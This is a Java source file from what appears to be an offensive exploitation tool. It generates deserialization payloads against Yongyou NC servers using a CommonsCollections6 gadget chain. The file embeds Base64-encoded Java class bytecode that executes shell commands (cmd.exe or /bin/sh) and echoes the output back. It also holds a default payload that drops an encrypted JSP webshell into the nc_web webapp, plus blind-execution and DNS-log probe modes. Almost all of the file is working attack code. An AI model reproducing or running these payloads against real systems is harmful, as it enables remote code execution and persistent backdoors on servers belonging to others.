package com.droplab.Controller.Yongyou.Service;

import com.droplab.Controller.Yongyou.Common.CommonsCollections6NC;
import com.droplab.Utils.CommonUtils;
import com.droplab.Utils.Echo.TomcatEcho;
import com.droplab.Utils.Factory.CodeFactory;
import com.droplab.Utils.HttpUtils;
import com.droplab.Utils.InfoUtils;
import com.droplab.Utils.Memory.MemroyFactory;
import com.droplab.Utils.ResponseUtils;
import com.droplab.Utils.UnSerialize.SerializeFactory;
import com.droplab.service.BugService;
import org.jsoup.Connection;
import sun.misc.BASE64Decoder;
import sun.misc.BASE64Encoder;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Iterator;

public class GetUnserializePayload extends BugService {
    @Override
    public Object run(String type) {
        try {
            if (params.size() > 0) {
                String mOption = null;
                String dnslog = null;
                String BlindExec = null;
                Iterator<String> iterator = params.keySet().iterator();
                while (iterator.hasNext()) {
                    String key = iterator.next();
                    if (key.equals("mOption")) {
                        mOption = params.get(key);
                    }else if (key.equals("dnslog")) {
                        dnslog = params.get(key);
                    } else if (key.equals("BlindExec")) {
                        BlindExec = params.get(key);
                    }
                }
                if (!mOption.equals("")) {
                    String code = null;
                    String classname = null;
                    byte[] object = null;
                    switch (mOption) {
                        case "Blind":
                            object = SerializeFactory.instance().getObject("", "BlindCommonsCollection6", BlindExec.getBytes(StandardCharsets.UTF_8));
                            break;
                        case "DNSLOG":
                            object = SerializeFactory.instance().getObject("", "URLDNS", dnslog.getBytes(StandardCharsets.UTF_8));
                            break;
                        case "Execute": //回显命令执行
                            code = "yv66vgAAADMA8QoAGwBkCgBlAGYKAGUAZwgAaAoATABpBwBqCgBlAGsIAGwKACEAbQgAbggAbwcAcAgAcQgAcggAcwcAdAgAdQcAdgsAEgB3CwASAHgIAHkKABsAeggAewcAfAkAHAB9CgAYAH4HAH8HAIAKABwAgQoAggCDCACECACFBwCGCACHCgAhAIgIAIkKACEAiggAiwgAjAgAjQoAIQCOCACPCgCQAJEIAJIKACEAkwgAlAgAlQgAlggAlwcAmAoAMgBkBwCZCgA0AJoKADQAmwoAnACdBwCeBwCfCACgCgA5AKEKADgAogoAOACjCgAyAKQKADIApQcApgoAQABkCgAyAKcJAKgAqQoAIQCqCgBAAKsKABgArAcArQoAGACuCgBHAIgKAK8AsAoArwCxBwCyAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHALIHAIYHALMHAH8HAHQHAHYHALQHAJgHALUHAJ4BAAVnZXRGVgEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7BwC2BwB8BwCtAQAKRXhjZXB0aW9ucwEAClNvdXJjZUZpbGUBAA1JeXJtQ21KVi5qYXZhDABNAE4HALMMALcAuAwAuQC6AQAHdGhyZWFkcwwAXABdAQATW0xqYXZhL2xhbmcvVGhyZWFkOwwAuwC8AQAEZXhlYwwAvQC+AQAEaHR0cAEABnRhcmdldAEAEmphdmEvbGFuZy9SdW5uYWJsZQEABnRoaXMkMAEAB2hhbmRsZXIBAAZnbG9iYWwBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAKcHJvY2Vzc29ycwEADmphdmEvdXRpbC9MaXN0DAC/AMAMAMEAwgEAA3JlcQwAwwDEAQAHZ2V0Tm90ZQEAD2phdmEvbGFuZy9DbGFzcwwAxQDGDADHAMgBABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL0ludGVnZXIMAE0AyQcAygwAywDMAQALZ2V0UmVzcG9uc2UBAAlnZXRIZWFkZXIBABBqYXZhL2xhbmcvU3RyaW5nAQAIVGVzdGVjaG8MAE0AzQEAB1Rlc3RkbWMMAM4AzwEACWFkZEhlYWRlcgEACFRlc3RFY2hvAQABIAwA0ADRAQAHb3MubmFtZQcA0gwA0wDUAQAHV2luZG93cwwA1QDWAQAeQzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxjbWQuZXhlAQACL2MBAAcvYmluL3NoAQACLWMBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgwATQDXDADYANkHANoMANsA3AEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyAQAFVVRGLTgMAE0A3QwATQDeDADfALwMAOAA4QwA4ADiAQAWc3VuL21pc2MvQkFTRTY0RW5jb2RlcgwA4wC8BwDkDADlAOYMAOcA6AwA6QDqDADrAOwBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24MAO0AxAcAtgwA7gDvDADBAPABAAhJeXJtQ21KVgEAEGphdmEvbGFuZy9UaHJlYWQBABNbTGphdmEvbGFuZy9TdHJpbmc7AQATamF2YS9pby9JbnB1dFN0cmVhbQEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAOZ2V0VGhyZWFkR3JvdXABABkoKUxqYXZhL2xhbmcvVGhyZWFkR3JvdXA7AQAHZ2V0TmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBAARzaXplAQADKClJAQADZ2V0AQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAEVFlQRQEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABChJKVYBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAdpc0VtcHR5AQADKClaAQAFc3BsaXQBACcoTGphdmEvbGFuZy9TdHJpbmc7KVtMamF2YS9sYW5nL1N0cmluZzsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEACnN0YXJ0c1dpdGgBABUoTGphdmEvbGFuZy9TdHJpbmc7KVoBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBACooTGphdmEvaW8vSW5wdXRTdHJlYW07TGphdmEvbGFuZy9TdHJpbmc7KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBABwoQylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBACFqYXZhL25pby9jaGFyc2V0L1N0YW5kYXJkQ2hhcnNldHMBAAVVVEZfOAEAGkxqYXZhL25pby9jaGFyc2V0L0NoYXJzZXQ7AQAIZ2V0Qnl0ZXMBAB4oTGphdmEvbmlvL2NoYXJzZXQvQ2hhcnNldDspW0IBAAZlbmNvZGUBABYoW0IpTGphdmEvbGFuZy9TdHJpbmc7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEADWdldFN1cGVyY2xhc3MBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7ACEATAAbAAAAAAACAAEATQBOAAEATwAAA7sACAAWAAACwiq3AAEBTAFNAz4quAACtgADEgS3AAXAAAbAAAbAAAY6BAM2BRUFGQS+ogKUGQQVBTI6BhkGxgKCGQa2AAc6BxkHEgi2AAmaAnEZBxIKtgAJmQJnKhkGEgu3AAU6CBkIwQAMmQJVKioqGQgSDbcABRIOtwAFEg+3AAU6CKcACDoJpwI3KhkIEhG3AAXAABI6CQM2ChUKGQm5ABMBAKICFBkJFQq5ABQCADoLKhkLEhW3AAU6CBkItgAWEhcEvQAYWQOyABlTtgAaGQgEvQAbWQO7ABxZBLcAHVO2AB46DBkMtgAWEh8DvQAYtgAaGQwDvQAbtgAeOg0ZDLYAFhIgBL0AGFkDEwAhU7YAGhkMBL0AG1kDuwAhWRIitwAjU7YAHsAAIU0ZDLYAFhIgBL0AGFkDEwAhU7YAGhkMBL0AG1kDuwAhWRIktwAjU7YAHsAAIUwsxgAKLLYAJZkADivGAUYrtgAlmgE/BD4stgAlmgA/GQ22ABYSJgW9ABhZAxMAIVNZBBMAIVO2ABoZDQW9ABtZA7sAIVkSJ7cAI1NZBLsAIVkSJ7cAI1O2AB5XK7YAJZoA8ysSKLYAKToOGQ6+BWC9ACE6DxIquAArOhAZEBIstgAtmQASGQ8DEi5TGQ8EEi9TpwAPGQ8DEjBTGQ8EEjFTAzYRFREZDr6iABUZDxURBWAZDhURMlOEEQGn/+m7ADJZtwAzOhG7ADRZGQ+3ADW2ADa2ADc6ErsAOFm7ADlZGRISOrcAO7cAPDoTGRO2AD1ZOhTGABMZERkUtgA+EAq2AD9Xp//ouwBAWbcAQRkRtgBCsgBDtgBEtgBFOhUZDbYAFhImBb0AGFkDEwAhU1kEEwAhU7YAGhkNBb0AG1kDuwAhWRIktwAjU1kEGRVTtgAeVx2ZAAanAAmECgGn/eYdmQAGpwAJhAUBp/1qpwAETLEAAgBlAHsAfgAQAAQCvQLAABAAAgBQAAAABgABAAAAAQBRAAAAywAU/wAkAAYHAFIHAFMHAFMBBwAGAQAA/wBZAAkHAFIHAFMHAFMBBwAGAQcAVAcAUwcAVQABBwBWBP0ADwcAVwH+AMgHAFUHAFUHAFUK+wBE/gA4BwBYBwBYBwBTC/wAAgH6ABn+AC0HAFkHAFoHAFv8ABoHAFP/AEsADgcAUgcAUwcAUwEHAAYBBwBUBwBTBwBVBwBXAQcAVQcAVQcAVQAA+AAG+gAF/wAGAAYHAFIHAFMHAFMBBwAGAQAA/wAFAAEHAFIAAEIHAFYAAAIAXABdAAIATwAAAHUAAwAGAAAAPgFOK7YAFjoEGQQTABulABkZBCy2AEZOpwAPOgUZBLYASDoEp//lLccADLsAR1kstwBJvy0EtgBKLSu2AEuwAAEAEAAXABoARwACAFAAAAAGAAEAAAABAFEAAAARAAT9AAgHAF4HAF9RBwBgCwwAYQAAAAQAAQAQAAEAYgAAAAIAYw==";
                            classname = "IyrmCmJV";
                            break;
                        case "MemoryShell":
                            code = "";
                            classname = "oJiAjwKA";
                            break;
                        case "UploadShell":
                        default:
                            code = "yv66vgAAADMAaAoAHgApBwAqCgArACwKACsALQgALgoALwAwCgAxADIKADMANAoANQA2CgA3ADgKAAIAOQoAAgA6BwA7BwA8CgAOACkKAA4APQgAPgoADgA/CgANADkHAEAHAEEKABUAKQgAQgoAFQBDCgAUAEQKAA0ARQoADQBGBwBHBwBIBwBJAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHAEgHADsHAEcBAApTb3VyY2VGaWxlAQANQVlUaEZ0b3IuamF2YQwAHwAgAQAMamF2YS9pby9GaWxlBwBKDABLAEwMAE0ATgEAKm9yZy5tb3ppbGxhLmphdmFzY3JpcHQuRGVmaW5pbmdDbGFzc0xvYWRlcgcATwwAUABRBwBSDABTAFQHAFUMAFYAVwcAWAwAWQBaBwBbDABcAF0MAB8AXgwAXwBdAQATamF2YS9pby9QcmludFdyaXRlcgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDABgAGEBACUvLi4vLi4vLi4vd2ViYXBwcy9uY193ZWIvZW96WkV3QmIuanNwDABiAF0BABBqYXZhL2xhbmcvU3RyaW5nAQAWc3VuL21pc2MvQkFTRTY0RGVjb2RlcgEIhGRHaHBjeUJwY3lCMFpYTjBhVzVuSUR4OGZENDhKVUJ3WVdkbElHbHRjRzl5ZEQwaWFtRjJZUzVzWVc1bkxuSmxabXhsWTNRdUtpeHFZWFpoTG5WMGFXd3VLaXhxWVhaaExtbHZMaW9zYW1GMllYZ3VZM0o1Y0hSdkxpb3NhbUYyWVhndVkzSjVjSFJ2TG5Od1pXTXVLaUlsUGp3bElXTnNZWE56SUUxNVRHOWhaR1Z5SUdWNGRHVnVaSE1nUTJ4aGMzTk1iMkZrWlhJZ2V3MEtDVTE1VEc5aFpHVnlLRU5zWVhOelRHOWhaR1Z5SUdNcElIc05DZ2tKQ1hOMWNHVnlLR01wTzMxOURRb2xQZzBLUENVTkNuUnllWHNOQ2drSlUzUnlhVzVuSUd0bGVUMGlPVEF3WW1NNE9EVmtOelUxTXpNM05TSTdEUW9KQ1hKbGNYVmxjM1F1YzJWMFFYUjBjbWxpZFhSbEtDSnphM2tpTENCclpYa3BPdzBLQ1FsVGRISnBibWNnWkdGMFlUMXlaWEYxWlhOMExtZGxkRkpsWVdSbGNpZ3BMbkpsWVdSTWFXNWxLQ2s3RFFvSkNXbG1JQ2hrWVhSaElUMGdiblZzYkNrZ2V3MEtDUWtKVTNSeWFXNW5JSFpsY2lBOUlGTjVjM1JsYlM1blpYUlFjbTl3WlhKMGVTZ2lhbUYyWVM1MlpYSnphVzl1SWlrN0RRb0pDUWxpZVhSbFcxMGdZMjlrWlQxdWRXeHNPdzBLQ1NBZ0lDQWdJQ0FnYVdZZ0tIWmxjaTVqYjIxd1lYSmxWRzhvSWpFdU9DSXBJRDQ5SURBcElIc05DZ2tnSUNBZ0lDQWdJQ0FnSUNCRGJHRnpjeUJDWVhObE5qUWdQU0JEYkdGemN5NW1iM0pPWVcxbEtDSnFZWFpoTG5WMElpc2lhV3d1UW1GelpUWTBJaWs3RFFvSklDQWdJQ0FnSUNBZ0lDQWdUMkpxWldOMElFUmxZMjlrWlhJZ1BTQkNZWE5sTmpRdVoyVjBUV1YwYUc5a0tDSm5aWFJFWldOdlpHVnlJaXdnS0VOc1lYTnpXMTBwSUc1MWJHd3BMbWx1ZG05clpTaENZWE5sTmpRc0lDaFBZbXBsWTNSYlhTa2diblZzYkNrN0RRb0pJQ0FnSUNBZ0lDQWdJQ0FnWTI5a1pTQTlJQ2hpZVhSbFcxMHBJRVJsWTI5a1pYSXVaMlYwUTJ4aGMzTW9LUzVuWlhSTlpYUm9iMlFvSW1SbFkyOWtaU0lzSUc1bGR5QkRiR0Z6YzF0ZGUySjVkR1ZiWFM1amJHRnpjMzBwTG1sdWRtOXJaU2hFWldOdlpHVnlMQ0J1WlhjZ1QySnFaV04wVzExN1pHRjBZUzVuWlhSQ2VYUmxjeWdpVlZSR0xUZ2lLWDBwT3cwS0NTQWdJQ0FnSUNBZ2ZTQmxiSE5sSUhzTkNna2dJQ0FnSUNBZ0lDQWdJQ0JEYkdGemN5QkNZWE5sTmpRZ1BTQkRiR0Z6Y3k1bWIzSk9ZVzFsS0NKemRXNHViV2x6WXk1Q1FWTWlLeUpGTmpSRVpXTnZaR1Z5SWlrN0RRb0pJQ0FnSUNBZ0lDQWdJQ0FnVDJKcVpXTjBJRVJsWTI5a1pYSWdQU0JDWVhObE5qUXVibVYzU1c1emRHRnVZMlVvS1RzTkNna2dJQ0FnSUNBZ0lDQWdJQ0JqYjJSbElEMGdLR0o1ZEdWYlhTa2dSR1ZqYjJSbGNpNW5aWFJEYkdGemN5Z3BMbWRsZEUxbGRHaHZaQ2dpWkdWamJ5SXJJbVJsUW5WbVptVnlJaXdnYm1WM0lFTnNZWE56VzExN1UzUnlhVzVuTG1Oc1lYTnpmU2t1YVc1MmIydGxLRVJsWTI5a1pYSXNJRzVsZHlCUFltcGxZM1JiWFh0a1lYUmhmU2s3RFFvSklDQWdJQ0FnSUNCOURRb0pDUWxEYVhCb1pYSWdZeUE5SUVOcGNHaGxjaTVuWlhSSmJuTjBZVzVqWlNnaVFVVlRJaWs3RFFvSkNRbGpMbWx1YVhRb01pd2dibVYzSUZObFkzSmxkRXRsZVZOd1pXTW9hMlY1TG1kbGRFSjVkR1Z6S0Nrc0lDSkJSVk1pS1NrN0RRb0pDUWxpZVhSbFcxMGdZMk52WkdVOVl5NWtiMFpwYm1Gc0tHTnZaR1VwT3cwS0NRa0pUWGxNYjJGa1pYSWdiV3c5Ym1WM0lFMTVURzloWkdWeUtIUm9hWE11WjJWMFEyeGhjM01vS1M1blpYUkRiR0Z6YzB4dllXUmxjaWdwS1RzTkNna0pDVTFsZEdodlpDQnRJRDBnYld3dVoyVjBRMnhoYzNNb0tTNW5aWFJUZFhCbGNtTnNZWE56S0NrdVoyVjBSR1ZqYkdGeVpXUk5aWFJvYjJRb0ltUmxabWx1SWlzaVpVTnNZWE56SWl3Z2JtVjNJRU5zWVhOelcxMTdZbmwwWlZ0ZExtTnNZWE56TENCcGJuUXVZMnhoYzNNc0lHbHVkQzVqYkdGemMzMHBPdzBLQ1FrSmJTNXpaWFJCWTJObGMzTnBZbXhsS0hSeWRXVXBPdzBLQ1FrSlEyeGhjM01nWTJ4elBTaERiR0Z6Y3lsdExtbHVkbTlyWlNodGJDeHVaWGNnVDJKcVpXTjBXMTE3WTJOdlpHVXNJREFzSUdOamIyUmxMbXhsYm1kMGFIMHBPdzBLQ1FrSlkyeHpMbTVsZDBsdWMzUmhibU5sS0NrdVpYRjFZV3h6S0hCaFoyVkRiMjUwWlhoMEtUc05DZ2tKZlEwS0NYMWpZWFJqYUNoRmVHTmxjSFJwYjI0Z1pTbDdEUXA5T3cwS2IzVjBQWEJoWjJWRGIyNTBaWGgwTG5CMWMyaENiMlI1S0NrN0RRb2xQZz09DABjAGQMAB8AZQwAZgBeDABnACABABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAIQVlUaEZ0b3IBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAPamF2YS9sYW5nL0NsYXNzAQATZ2V0UHJvdGVjdGlvbkRvbWFpbgEAIigpTGphdmEvc2VjdXJpdHkvUHJvdGVjdGlvbkRvbWFpbjsBAB5qYXZhL3NlY3VyaXR5L1Byb3RlY3Rpb25Eb21haW4BAA1nZXRDb2RlU291cmNlAQAcKClMamF2YS9zZWN1cml0eS9Db2RlU291cmNlOwEAGGphdmEvc2VjdXJpdHkvQ29kZVNvdXJjZQEAC2dldExvY2F0aW9uAQAQKClMamF2YS9uZXQvVVJMOwEADGphdmEvbmV0L1VSTAEAB2dldFBhdGgBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAFShMamF2YS9sYW5nL1N0cmluZzspVgEACWdldFBhcmVudAEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAMZGVjb2RlQnVmZmVyAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEABShbQilWAQAFd3JpdGUBAAVjbG9zZQAhAB0AHgAAAAAAAQABAB8AIAABACEAAACcAAUAAwAAAGMqtwABAUy7AAJZuAADtgAEEgW2AAa2AAe2AAi2AAm2AAq3AAu2AAxNuwANWbsADlm3AA8stgAQEhG2ABC2ABK3ABNMK7sAFFm7ABVZtwAWEhe2ABi3ABm2ABortgAbpwAETbEAAQAGAF4AYQAcAAIAIgAAAAYAAQAAAAEAIwAAABMAAv8AYQACBwAkBwAlAAEHACYAAAEAJwAAAAIAKA==";
                            classname = "AYThFtor";
                            //System.out.println("落地shell路径：http://127.0.0.1/eozZEwBb.jsp");
                            break;
                    }

                    if (code != null && object == null) {
                        byte[] decode = new BASE64Decoder().decodeBuffer(code);
                        object = CommonsCollections6NC.instance().getObject(decode, classname);//cc6 用友专用反序列化链
                    }
                    ResponseUtils responseUtils = new ResponseUtils();
                    responseUtils.setMessage(java.util.Base64.getEncoder().encodeToString(object));
                    return responseUtils;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}
